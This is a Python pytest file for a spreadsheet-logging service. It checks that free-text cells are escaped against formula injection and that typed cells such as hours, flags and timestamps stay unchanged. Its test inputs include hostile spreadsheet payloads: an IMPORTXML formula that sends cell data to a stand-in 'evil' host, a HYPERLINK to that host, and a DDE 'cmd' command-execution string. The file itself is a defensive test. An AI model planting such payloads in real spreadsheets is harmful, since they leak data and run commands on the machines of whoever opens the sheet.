"""REPS Sheet append hygiene: free-text cells cannot become formulas, and the
typed cells (hours, TRUE/FALSE, timestamps) are exactly what they were."""

from __future__ import annotations

import pytest

from BL.reps.common.reps_service import build_log_row, neutralize_formula


class TestNeutralizeFormula:
    @pytest.mark.parametrize("value", ["=IMPORTXML(\"https://evil\", \"//x\")", "+1+1", "-cmd|' /C calc'!A0", "@SUM(A1)", "\tx", "\rx"])
    def test_formula_leaders_get_an_apostrophe(self, value):
        assert neutralize_formula(value) == "'" + value

    @pytest.mark.parametrize("value", ["Met with Gilly at Honda to review plumbing", "1 Ocean Dr", "", "a=b", "x + y", "Yarden2026"])
    def test_ordinary_text_is_unchanged(self, value):
        assert neutralize_formula(value) == value

    def test_none_becomes_empty(self):
        assert neutralize_formula(None) == ""  # type: ignore[arg-type]


class TestBuildLogRow:
    def _row(self, **overrides):
        args = dict(
            user="Aviv2026",
            created_at_iso="2026-09-07T10:00:00+00:00",
            property_name="12 Ocean Dr",
            activity_category="Site visit",
            description="Walked the property with the contractor and reviewed the roof",
            start_iso="2026-09-07T08:00:00+00:00",
            end_iso="2026-09-07T09:30:00+00:00",
            total_hours=1.5,
            evidence_text="Roof photos\nContractor quote",
            location="START 2026-09-07T08:00:00Z @ 25.77410,-80.19370",
            material_participation_rentals=True,
            people_involved=["Gilly", " Dana ", ""],
        )
        args.update(overrides)
        return build_log_row(**args)

    def test_typed_cells_and_order_are_unchanged(self):
        row = self._row()
        assert len(row) == 12
        assert row[0] == "Aviv2026"
        assert row[4] == "2026-09-07T08:00:00+00:00"
        assert row[5] == "2026-09-07T09:30:00+00:00"
        assert row[6] == 1.5 and isinstance(row[6], float)
        assert row[9] == "TRUE"
        assert row[10] == "Dana, Gilly"
        assert row[11] == "2026-09-07T10:00:00+00:00"

    def test_false_flag(self):
        assert self._row(material_participation_rentals=False)[9] == "FALSE"

    def test_free_text_cells_are_neutralised(self):
        row = self._row(
            description="=IMPORTXML(\"https://evil/?\"&A1, \"//x\")",
            property_name="+1 Ocean Dr",
            activity_category="@meeting",
            location="-remote",
            people_involved=["=HYPERLINK(\"https://evil\",\"CPA\")"],
            evidence_text="=cmd",
        )
        assert row[3].startswith("'=IMPORTXML")
        assert row[1] == "'+1 Ocean Dr"
        assert row[2] == "'@meeting"
        assert row[8] == "'-remote"
        assert row[10].startswith("'=HYPERLINK")
        assert row[7] == "'=cmd"
